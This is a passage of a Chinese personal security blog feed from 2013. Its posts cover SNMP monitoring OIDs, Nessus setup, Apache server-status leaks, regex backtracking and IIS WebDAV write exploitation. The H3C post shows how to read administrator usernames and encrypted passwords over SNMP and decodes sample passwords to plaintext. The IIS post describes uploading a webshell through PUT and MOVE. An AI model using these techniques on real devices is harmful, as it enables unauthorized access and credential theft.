ifColliPkts 冲突报总数 5.1.49&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2537'&gt;华为&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www-2w.blog.163.com/blog/static/97931518200931371710192/'&gt;华为oid参考a资料&lt;/a&gt;&lt;/p&gt;

&lt;h1 id='vrp_software_version_340_release_1702quidway_router_ar18231'&gt;VRP software, Version 3.40, Release 1702.Quidway Router AR18-23-1&lt;/h1&gt;

&lt;pre&gt;&lt;code&gt;hwCpuCostRatePer5Sec 1.3.6.1.4.1.2011.2.2.4.12.0 5秒cpu
hwCpuCostRatePer5Minute 1.3.6.1.4.1.2011.2.2.4.13.0 5分钟cpu使用
hwUsedMemory 1.3.6.1.4.1.2011.2.2.5.1.0 使用的内存&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='windows'&gt;windows性能&lt;/h2&gt;

&lt;p&gt;测试2003,win7貌似不行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.2.1.25.3.3.1.2  cpu使用率
1.3.6.1.2.1.25.2.2.0   内存使用单位KB&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href='http://hongliangpan.iteye.com/blog/226983'&gt;详细列表&lt;/a&gt; &lt;a href='http://www.oidview.com/mibs/0/HOST-RESOURCES-MIB.html'&gt;oidview参考资料&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='linux'&gt;linux性能&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://www.debianadmin.com/linux-snmp-oids-for-cpumemory-and-disk-statistics.html'&gt;Linux SNMP OID’s for CPU,Memory and Disk Statistics&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.1.2021.10.1.3.1  一分钟load
1.3.6.1.4.1.2021.4.6.0  内存使用量&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/技术研究/2013/07/24/snmp-oid-</link>
                <guid>http://username.github.io/技术研究/2013/07/24/snmp-oid-</guid>
                <pubDate>2013-07-24T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>nessus5.2.1离线安装插件</title>
                <description>&lt;p&gt;需要在内网安装nessus5.2.1,发现安装插件还是有点小麻烦的。按照给出的提示访问https://plugins.nessus.org/offline.php 通过生成挑战码和激活码才能下载到插件的包。然后用命令更新插件。我最后的成功的操作是这样子的。&lt;/p&gt;

&lt;p&gt;下载好安装包之后，用nessus安装目录下的 nessus-update-plugins.exe&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;nessus-update-plugins.exe c:/path/plugin.tar.gz&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;更新之后就可以用了。&lt;/p&gt;

&lt;h1 id='id2536'&gt;参考资料&lt;/h1&gt;

&lt;p&gt;&lt;a href='http://baoz.net/nessus-plugin-offline-download/'&gt;素包子的博客&lt;/a&gt; &lt;a href='http://plugins.nessus.org/get.php?f=all-2.0.tar.gz&amp;amp;u=48bae26f3c2b20452e6f2c1517e07206&amp;amp;p=bb2c6cbfc82746e66205f5634ef360ff'&gt;直接下载nessus插件包&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;详细的步骤跟他提到的有些不一样。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/19/nessus521</link>
                <guid>http://username.github.io/2013/07/19/nessus521</guid>
                <pubDate>2013-07-19T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>server status 信息引起的信息泄漏</title>
                <description>&lt;p&gt;http://www.apache.org/server-status&lt;/p&gt;

&lt;p&gt;server-status没有限制访问，导致信息泄漏。&lt;/p&gt;

&lt;p&gt;泄漏的信息点：&lt;/p&gt;

&lt;p&gt;apache server Status for www.apache.org (via 140.211.11.131) 这个说明泄露了真实ip，不过经过测试apache也没有做cdn，应该有做负载均衡，有时候刷新，这个说明的ip会变成另外一个，经测试直接访问ipapache的主页。&lt;/p&gt;

&lt;p&gt;2,Server uptime: 3 days 4 hours 48 minutes 43 seconds Server load: 8.24 8.77 9.57 Total accesses: 35420283 - Total Traffic: 1706.5 GB CPU Usage: u4146.86 s1566 cu0 cs0 - 2.07% CPU load 128 requests/sec - 6.3 MB/second - 50.5 kB/request 88 requests currently being processed, 552 idle workers 性能信息，看起来才跑了3天，经常挂么难道。流量1700G，很是惊人。。。&lt;/p&gt;

&lt;p&gt;3,58.179.141.82 wiki-online.apache.org:80 GET /wiki/modernized/img/moin-www.png&lt;/p&gt;

&lt;p&gt;client 泄露了客户端的ip，在有一些场景下，客户端ip也是隐私，不应该泄漏。&lt;/p&gt;

&lt;p&gt;4,vhost 泄露了apache上跑得多个网站。这个对渗透的信息收集也是很有用处的。比如各种旁站啥的。可以看到wiki-online.apache.org:80 www.apache.org:80 archive.apache.org:80 httpd.apache.org:80 www.openoffice.org:80 。都是跑在这上面的。原来openofffice也在这里。&lt;/p&gt;

&lt;p&gt;5,泄露了url。某些禁止搜索引擎收录的url都会真实的现实出来。比如，是不是可以通过对url的长期分析来找管理后台。&lt;/p&gt;

&lt;p&gt;本文纯属YY，不当之处还请指正。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/18/server-status-</link>
                <guid>http://username.github.io/2013/07/18/server-status-</guid>
                <pubDate>2013-07-18T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>snmp获取h3c交换机流量和性能信息</title>
                <description>&lt;p&gt;交换机型号：h3c s5500ei&lt;/p&gt;

&lt;p&gt;关于mib浏览器。 没有找到一个公认的结果。搜索了下，先下了hilisoft mib browser 1.7,在有的教程中也看到有用这个，可是未注册版太难用了，诸多限制，一会就弹提示，很不爽。放弃。然后google，mib browser，有个oid view的广告。下来看了下，虽然只有几天的试用。但是功能实在是太强大了。方便好用。强烈推荐。&lt;/p&gt;

&lt;p&gt;获取cpu性能和内存的信息&lt;/p&gt;

&lt;p&gt;需要下载h3c的mib库。comware mib。然后导入&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Comware_MIB\H3C New Style Private MIB\hh3c-entity-ext.mib&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;经过测试，在oidview里需要先导入hh3c-oid.mib，即25506的库。&lt;/p&gt;

&lt;p&gt;然后在 SMI-&amp;gt;(01)iso-&amp;gt;(03)org-&amp;gt;(06)dod-&amp;gt;(01)internet-&amp;gt;(04)private-&amp;gt;(01)Enterprise-&amp;gt;(02011)Huawei/(25506)hh3c-&amp;gt;h3c-&amp;gt;h3ccommon-&amp;gt;h3cEntityExtend-&amp;gt;h3cEntityExtObjects-&amp;gt;h3cEntityExtState-&amp;gt;h3cEntityExtStateTable-&amp;gt;h3cEntityExtStateEntry&lt;/p&gt;

&lt;p&gt;下面有很多的选项，比如：h3cEntityExtCpuUsage就是我们要用到的CPU使用率，h3cEntityExtMemUsage就是内存使用率。&lt;/p&gt;

&lt;p&gt;具体参考&lt;a href='http://hi.baidu.com/zcc_zhu/item/9259f2bcb7abc645ba0e1228'&gt;获取交换机性能&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;获取交换机流量信息&lt;/p&gt;

&lt;p&gt;抓取mrtg的发送的流量包如下&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; GetRequest(74) R=24050685  interfaces.ifTable.ifEntry.ifInOctets.22 interfaces.ifTable.ifEntry.ifOutOctets.22 system.sysUpTime.0 system.sysName.0 &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;发现mrtg只是取了流入的总流量和流出的总流量。而之前研究mrtg日志格式的时候发现，mrtg除了记录总流量，还记录了平均速率和最高的速率。可见，mrtg展示的平均速率是自己计算出来的。&lt;/p&gt;

&lt;p&gt;仔细查看mrtg发送的请求发现，它忽略了端口状态为down的端口。所以最后的结论是先根据ifnumber取到所有端口的数量。然后遍历，iftype，ifadminstatus，ifoperstatus，取端口状态，根据端口的类型和状态生成最后的需要获取流量的端口号。iftype有国际标准的，可以根据这个来判断端口是不是物理口。&lt;a href='http://tools.cisco.com/Support/SNMP/do/BrowseOID.do?local=en&amp;amp;translate=Translate&amp;amp;objectInput=1.3.6.1.2.1.2.2.1.3'&gt;iftype的标准&lt;/a&gt;。另外发现ifadminstatus和ifoperstatus有些不同，mrtg应该是按照ifadminstatus来判断的。&lt;/p&gt;

&lt;p&gt;分析到这里，已经可以写程序来监控h3c的cpu，内存和流量信息了。&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/16/snmph3c</link>
                <guid>http://username.github.io/2013/07/16/snmph3c</guid>
                <pubDate>2013-07-16T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>markdown 语法概要</title>
                <description>&lt;h2 id='id2535'&gt;速查备忘&lt;/h2&gt;

&lt;p&gt;&lt;a href='http://ued.taobao.com/blog/2012/07/getting-started-with-markdown/'&gt;开始使用markdown&lt;/a&gt; &lt;a href='http://jblevins.org/projects/markdown-mode/'&gt;emacs markdown插件&lt;/a&gt;&lt;/p&gt;

&lt;h2 id='tips'&gt;小tips&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;要先空一行，然后tab键缩进，才能标识代码。&lt;/li&gt;
&lt;/ol&gt;</description>
                <link>http://username.github.io/2013/07/16/markdown-</link>
                <guid>http://username.github.io/2013/07/16/markdown-</guid>
                <pubDate>2013-07-16T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>h3c snmp获取管理员登录密码</title>
                <description>&lt;h3 id='id2532'&gt;参考资料&lt;/h3&gt;

&lt;p&gt;&lt;a href='http://www.wooyun.org/bugs/wooyun-2010-021877'&gt;h3c获取管理员密码&lt;/a&gt; &lt;a href='http://www.wooyun.org/bugs/wooyun-2010-021964'&gt;华为交换机获取管理员密码&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;测试型号：h3c SecPath F5000-A5&lt;/p&gt;

&lt;h3 id='id2533'&gt;漏洞详情&lt;/h3&gt;

&lt;p&gt;管理员用户名和密码可以通过snmp读取，从而获得管理权限。h3c的私有mib有两种，一种是2011（huawei h3c),一种是25506（hh3c)。经过测试发现，有些设备只支持一种。如果一种获取不到数据，可以两种都尝试下。相关的oid为：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.1.2011.10.2.12.1.1.1.1.1 h3cUserName OCTET-STRING admin 
1.3.6.1.4.1.2011.10.2.12.1.1.1.1.2 h3cUserName OCTET-STRING h3c 
1.3.6.1.4.1.2011.10.2.12.1.1.1.1.3 h3cUserName OCTET-STRING pppoe 
1.3.6.1.4.1.2011.10.2.12.1.1.1.2.1 h3cUserPassword OCTET-STRING .]@USE=B,53Q=^Q`MAF4&amp;lt;1!! 
1.3.6.1.4.1.2011.10.2.12.1.1.1.2.2 h3cUserPassword OCTET-STRING test 
1.3.6.1.4.1.2011.10.2.12.1.1.1.2.3 h3cUserPassword OCTET-STRING pppoe 

1.3.6.1.4.1.2011.10.2.12.1.1.1.1.1为用户名，
如果有多个用户则最后一位依次为2,3...
1.3.6.1.4.1.2011.10.2.12.1.1.1.2.1为第一个用户的密码，以此类推。
后面还有一些oid可以获取用户用户是否有管理权限等。需要详细研究的话可以walk一下看看。&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;25506 相关的oid为：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.3.6.1.4.1.25506.2.12.1.1.1.1.1 h3c 
1.3.6.1.4.1.25506.2.12.1.1.1.2.1 P.KG0&amp;gt;5&amp;amp;YV3;5#)%#Z[VS1!! 
1.3.6.1.4.1.25506.2.12.1.1.1.3.1 7 
1.3.6.1.4.1.25506.2.12.1.1.1.4.1 3 
1.3.6.1.4.1.25506.2.12.1.1.1.5.1 0 
1.3.6.1.4.1.25506.2.12.1.1.1.6.1 1 &lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样，第一个为用户名，第二个为密码。&lt;/p&gt;

&lt;p&gt;获取到的密码是一个加密的字符串。&lt;a href='https://github.com/grutz/h3c-pt-tools/blob/master/hh3c_cipher.py'&gt;解密的工具可以在这里下载&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;.]@USE=B,53Q=^Q`MAF4&amp;lt;1!!: admin
-AO7S27&amp;amp;QTCQ=^Q`MAF4&amp;lt;1!!: h3c123
P.KG0&amp;gt;5&amp;amp;YV3;5#)%#Z[VS1!!: Zjyd_h3c_10
如上，可以直接得到明文的密码。然后就可以在web登录了。&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id='id2534'&gt;实例测试&lt;/h3&gt;

&lt;p&gt;&lt;img alt='test' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/h3c.png' /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='test1' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/h3c1.png' /&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/16/h3c-snmp</link>
                <guid>http://username.github.io/2013/07/16/h3c-snmp</guid>
                <pubDate>2013-07-16T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>github搭建博客</title>
                <description>&lt;p&gt;提交了文章之后，github不build了。经过搜索发现可能是插件文件或者post有语法错误等原因。本地用命令 jekyll build &amp;#8211;safe 测试，发现报错。说是什么没有闭合，原来是一句bash代码中的内容被当作markdown解释了。用tab键标记代码就可以了。&lt;/p&gt;

&lt;h1 id='id2531'&gt;内容引用图片&lt;/h1&gt;

&lt;p&gt;采用的方式是在配置文件中添加了一个变量site.img_url，每次添加图片如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;![test](\{\{site.img_url\}\}egrep.png) 就可以了。&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id='github'&gt;其他github搭建的博客参考&lt;/h1&gt;

&lt;p&gt;&lt;a href='http://weizhifeng.net/'&gt;http://weizhifeng.net/&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/08/github</link>
                <guid>http://username.github.io/2013/07/08/github</guid>
                <pubDate>2013-07-08T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>bash 命令集锦</title>
                <description>&lt;p&gt;把用户添加到管理员组&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;usermod -g group loginname 强行设置某个用户所在组
usermod -G groups loginname 把某个用户改为 group(s)
usermod -a -G groups loginname 把用户添加进入某个组(s）&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;过滤开放某一端口的IP&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;nmap 123.125.105.51/24 -p 8080| grep open -B4 | grep -o &amp;#39;123.*&amp;#39;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;tar解压到指定文件夹&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar -zxvf xx.tar.gz -C /your/directory/&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;tar打包压缩目录&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;tar czf small.tar.gz small(目录名)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;杀死多个特定 名称的进程&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ps aux |grep mysql |grep -v grep  |awk &amp;#39;{print $2}&amp;#39; |xargs kill -9
killall -TERM mysqld
kill -9 `cat /usr/local/apache2/logs/httpd.pid`&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id='id2530'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://shentar.me/?s=shell&amp;amp;searchsubmit=Search#post-966&lt;/p&gt;</description>
                <link>http://username.github.io/工具使用/2013/07/03/bash-</link>
                <guid>http://username.github.io/工具使用/2013/07/03/bash-</guid>
                <pubDate>2013-07-03T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>宽字节注入研究</title>
                <description>&lt;p&gt;for test&lt;/p&gt;</description>
                <link>http://username.github.io/2013/07/03/</link>
                <guid>http://username.github.io/2013/07/</guid>
                <pubDate>2013-07-03T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>iis put 写权限利用</title>
                <description>&lt;h3 id='iis'&gt;iis写权限的条件&lt;/h3&gt;

&lt;p&gt;这个问题本质上是一个配置错误。已经出来很多年了。现在不太常见了。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;web服务扩展的webDAV扩展要开启。&lt;/li&gt;

&lt;li&gt;主目录里的权限要给写入权限，和脚本资源访问权限（没有脚本访问权限，可以利用iis解析漏洞）。 3.匿名用户要给写权限和修改权限。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;图示如下：&lt;/p&gt;

&lt;p&gt;&lt;img alt='webDAV' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/webdav.png' /&gt; &lt;img alt='webDAV' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/write1.png' /&gt; &lt;img alt='webDAV' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/write2.png' /&gt;&lt;/p&gt;

&lt;h3 id='id2526'&gt;测试过程&lt;/h3&gt;

&lt;p&gt;使用桂林老兵的写权限利用工具和winsock expert抓包分析。 &lt;img alt='webDAV' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/winsock.png' /&gt;&lt;/p&gt;

&lt;p&gt;如果服务器没有开webdav扩展，put请求返回501 not implemented ,如果开了webdav，目录没有给写入权限，返回403 forbidden,如果目录有写入权限，用户没有给写权限，返回 401 unauthorized,如果条件都满足，返回201 created,表明文件成功上传。如果文件已经存在，则更新文件，返回 200.&lt;/p&gt;

&lt;h3 id='id2527'&gt;利用思路&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;上传txt，move改名为asp或者利用iis的解析漏洞。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id='id2528'&gt;一次完整攻击的日志记录&lt;/h3&gt;

&lt;p&gt;2013-06-20 03:02:30 W3SVC1 192.168.100.22 PUT /yanshi.txt - 80 - 192.168.100.33 - 201 0 0 2013-06-20 03:02:49 W3SVC1 192.168.100.22 MOVE /yanshi.txt - 80 - 192.168.100.33 - 201 0 0 2013-06-20 03:03:23 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0 2013-06-20 03:03:23 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0 2013-06-20 03:03:31 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0 2013-06-20 03:03:33 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0 2013-06-20 03:03:58 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0 2013-06-20 03:03:59 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0 2013-06-20 03:04:00 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0 2013-06-20 03:04:00 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0 2013-06-20 03:04:03 W3SVC1 192.168.100.22 POST /yanshi.asp - 80 - 192.168.100.33 Mozilla/5.0+(Windows;+Windows+NT+5.1;+en-US)+Firefox/3.5.0 200 0 0&lt;/p&gt;

&lt;p&gt;先通过put方法上传文件，然后使用move方法修改文件名。之后post数据跟webshell交互。检测到put跟move方法，就可以判断为上传木马的尝试，是否成功需要看服务器返回的状态码。&lt;/p&gt;

&lt;h3 id='207_multistatus'&gt;207 Multi-Status&lt;/h3&gt;

&lt;p&gt;关于move操作的时候返回207 的问题，参考资料里有提到。解决方案就是利用iis的解析漏洞。经过一番测试发现，之所以会出现这个问题，是由于服务器的配置问题。如果目录权限没有给脚本资源访问的权限，那么会返回207 同时body里面会说明是 403 forbidden，可以通过iis的解析漏洞解决。还有一种情况是匿名用户没有文件修改权限，这是body里说明是401 unauthorized，这种情况就没有办法了。&lt;/p&gt;

&lt;h3 id='id2529'&gt;参考资料&lt;/h3&gt;

&lt;p&gt;&lt;a href='http://4ngel.net/article/33.htm'&gt;协议级别的分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.oldjun.com/oldblog/article.asp?id=129'&gt;再试IIS写权限以及move为asp的问题&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://www.oldjun.com/blog/index.php/archives/77/'&gt;写权限漏洞来有解释&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href='http://drops.wooyun.org/papers/238'&gt;webdav安全配置&lt;/a&gt;&lt;/p&gt;</description>
                <link>http://username.github.io/2013/06/19/iis-put-</link>
                <guid>http://username.github.io/2013/06/19/iis-put-</guid>
                <pubDate>2013-06-19T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>正则表达式效率分析</title>
                <description>&lt;h3 id='1ppt'&gt;建议先读一下参考资料1中的ppt&lt;/h3&gt;

&lt;p&gt;ppt中关于正则运行原理的部分讲的很不错。写了很久，发现我还是没把回溯这个事情将清楚。最好自己用regexbuddy调试一下，可以加深理解。&lt;/p&gt;

&lt;h3 id='id2521'&gt;两种引擎&lt;/h3&gt;

&lt;p&gt;要分析正则表达式效率的问题首先需要了解正则表达式引擎运行的原理。简单的说，正则表达式的引擎主要有两种：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;DFA Deterministic finite automaton 确定型有穷自动机&lt;/li&gt;

&lt;li&gt;NFA Non-deterministic finite automaton 非确定型有穷自动机&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;DFA又称为文本导向的引擎，比如用正则&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    abc|abcdef&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;去匹配字符串&amp;#8221;abcdefghi&amp;#8221;,匹配的结果是abcdef。它的过程是这样子的：拿字符串中的地一个字符&amp;#8221;a&amp;#8221;跟正则的两个分支匹配，匹配成功。然后把权限让给第二个字符&amp;#8221;b&amp;#8221;，&amp;#8221;b&amp;#8221;跟两个分支匹配也成功，然后第三个字符&amp;#8221;c&amp;#8221;，&amp;#8221;c&amp;#8221;匹配成功之后匹配的过程没有结束。而是继续用后面的字符&amp;#8221;d&amp;#8221;去跟正则匹配，这时候第一个分支匹配失败，被淘汰掉，第二个分支匹配成功。后续&amp;#8221;e&amp;#8221;&amp;#8221;f&amp;#8221;也匹配成功，所以最后的结果是匹配成功，匹配到的字符串是&amp;#8221;abcdef&amp;#8221;.&lt;/p&gt;

&lt;p&gt;NFA又称为正则导向的引擎。还是用上一个例子。如果是一个正则导向的引擎去匹配的话，匹配到的结果是&amp;#8221;abc&amp;#8221;,而不是&amp;#8221;abcdef&amp;#8221;。它的工作过程是这样子的，一开始的控制权是在正则表达式的手里。它用&amp;#8221;abc|abcdef&amp;#8221;的地一个分支去跟要匹配的字符串&amp;#8221;abcdefghi&amp;#8221;，（在之前DFA的工作流程中，控制权是在字符串手里，用字符串去跟正则匹配，所以DFA成为文本导向。这里，控制权在正则表达式的手里，所以称为正则导向）正则第一个分支&amp;#8221;abc&amp;#8221;跟字符串&amp;#8221;abcdefghi&amp;#8221;匹配成功之后，NFA引擎就立刻上报发现成功匹配，匹配结果是&amp;#8221;abc&amp;#8221;，它就不会继续去匹配正则的第二个分支了。&lt;/p&gt;

&lt;p&gt;示例： egrep 默认使用的正则引擎是DFA，grep -P 参数是指用perl的正则引擎，属于NFA的引擎。可以看到匹配到的字符是不同的。&lt;/p&gt;

&lt;p&gt;&lt;img alt='test' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/egrep.png' /&gt;&lt;/p&gt;

&lt;h3 id='dfanfa'&gt;DFA与NFA的区别&lt;/h3&gt;

&lt;p&gt;DFA不需要回溯，匹配快速，但是不支持捕获组，所以也不支持反向引用等多种特性。目前使用DFA引擎的语言和工具主要有awk，egrep和lex。&lt;/p&gt;

&lt;p&gt;NFA支持捕获组，惰性量词等，需要回溯。所以他的匹配速度相对慢一些，但是支持的特性多。我们平时用的大多数语言和工具都是NFA引擎。比如:java,php,python,ruby&amp;#8230;..&lt;/p&gt;

&lt;p&gt;本文对于正则表达式效率的讨论也是基于标准的NFA引擎。&lt;/p&gt;

&lt;h3 id='id2522'&gt;性能和回溯&lt;/h3&gt;

&lt;p&gt;正则的语法就不介绍了。这里用一个例子稍微详细的介绍一下正则匹配的过程和回溯的概念。用正则&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID:\s*(.*?)MMM&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;去匹配&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID:   S-1-2MMM&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;先看一下匹配过程。&lt;/p&gt;

&lt;p&gt;&lt;img alt='backtrack' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/backtrack.png' /&gt;&lt;/p&gt;

&lt;p&gt;先用正则的I跟字符串的I匹配，匹配成功，后面类似。当控制权权到&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;\s*&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里的时候，\s和修饰它的量词是作为一个整体来匹配的。由于是贪婪模式，所以第四步，一下匹配了3个空格。然后控制权到了&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(.*?)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里是非贪婪模式，所以它优先选任意字符出现零次，即什么都没有匹配。（这里是第5,第6步，因为有括号。所以是两步）只是在这里做了一个标记，因为这里有多种可能行，当后面匹配失败，就会重新回到这里，然后控制权就到了正则里的&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;M&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里。第七步，M跟字符串的S匹配，匹配失败。控制权重新回到&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(.*?)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这里。这个过程就是一个回溯。回到这里之后，这次就会去尝试匹配一个任意字符。这里匹配了S，然后在这里做了标记，控制权又交给了M，M匹配又失败，又回溯到之前标记的地方。&lt;/p&gt;

&lt;p&gt;可以看到这个成功的匹配过程经过了5次回溯。下图是匹配失败时候的回溯，其实匹配成功一般不会有性能问题，出现性能问题一般都是匹配失败的时候。&lt;/p&gt;

&lt;p&gt;为了方便讲解，把正则跟需要匹配的字符串都简化了一下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;正则：ID:\s*(.*?)M
字符串：ID: SN&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;匹配失败，用了30步。&lt;/p&gt;

&lt;p&gt;&lt;img alt='shibai' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/jianhua2.png' /&gt;&lt;/p&gt;

&lt;p&gt;匹配成功的时候只有10步。&lt;/p&gt;

&lt;p&gt;&lt;img alt='chenggong' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/jianhua.png' /&gt;&lt;/p&gt;

&lt;p&gt;其实最好的办法是放到regexbuddy里调试一下。可以看到16步，当后面的都匹配失败，回溯点回到了&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;\s* 这里。\s*是贪婪匹配，之前匹配了一个空格。&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可是后面的都匹配失败了，它至少吐一个空格出来。然后，后面的&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(.*?)M再来一边。&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;17步是&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(.*?) 非贪婪匹配，匹配了零个字符。。。。。。&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id='id2523'&gt;如何避免回溯&lt;/h3&gt;

&lt;p&gt;回溯可能产生的地方有两个，一个是分支结构，一个是量词。&lt;/p&gt;

&lt;p&gt;对于分支结构来说，可以把概率高的分支放在前面，因为NFA是优先选择左端的结果。&lt;/p&gt;

&lt;p&gt;对于量词来说有三个思路。&lt;/p&gt;

&lt;p&gt;* 一个是元字符的精确化，就是尽量详细分析字符内容，慎重用点号星号。 * 另一个就是用原子组和占有优先量词避免回溯。 * 避免两个及以上使用了量词的元字符紧挨在一起，这样子会引起大量的回溯。&lt;/p&gt;

&lt;h4 id='id2524'&gt;实例测试&lt;/h4&gt;

